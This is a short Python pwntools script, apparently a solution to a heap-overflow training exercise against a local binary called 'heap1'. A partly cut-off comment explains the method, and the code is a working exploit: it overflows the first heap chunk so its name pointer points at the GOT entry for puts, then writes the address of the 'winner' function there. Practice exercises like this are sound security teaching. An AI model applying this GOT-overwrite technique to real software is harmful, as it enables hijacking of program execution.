#This script will overwrite the value of the 'name' pointer of the first chunk (first allocated heapStructure) with the GOT table address of the 'puts' function. At that GOT table address of 'puts' we have the address in memory where the code for 'puts' is located (code originally from glibc but linked to our executable file). So after the first strcpy, the 'name' of the first heapStructure contains the GOT table address of 'puts', and the second strcpy will take the second argument from command line and in the line 'strcpy(i2->name, argv[2]);' place it where the 
#
#
#

from pwn import *

elf = context.binary = ELF('./heap1', checksec=False)

param1 = (b'A' * 40 + p64(elf.got['puts'])).replace(b'\x00', b'')
param2 = p64(elf.sym['winner']).replace(b'\x00', b'')

p = elf.process(argv=[param1, param2])

print(p.clean().decode('latin-1'))

